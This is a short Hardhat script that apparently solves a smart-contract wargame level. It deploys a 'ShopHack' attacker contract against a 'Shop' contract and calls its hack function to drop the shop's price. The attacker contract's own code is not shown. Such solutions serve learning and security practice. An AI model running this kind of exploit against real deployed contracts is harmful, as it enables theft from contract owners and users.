import { fail } from "assert";
import { ethers } from "hardhat";

async function shopHack() {
  const shopAddress = process.env.SHOP_ADDRESS || fail("SHOP_ADDRESS Not Found In .env");
  const [attacker] = await ethers.getSigners();
  const shop = await ethers.getContractAt("Shop", shopAddress);
  const ShopHack = await ethers.getContractFactory("ShopHack");
  const shopHack = await ShopHack.connect(attacker).deploy(shop.address);
  await shopHack.deployed();

  console.log("Price Before Hack : ", await shop.price());
  const tx = await shopHack.hack();
  await tx.wait(1);
  console.log("Price After Hack : ", await shop.price());

  console.log("SUCCESS!!! Submit the instance.");
}

shopHack().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
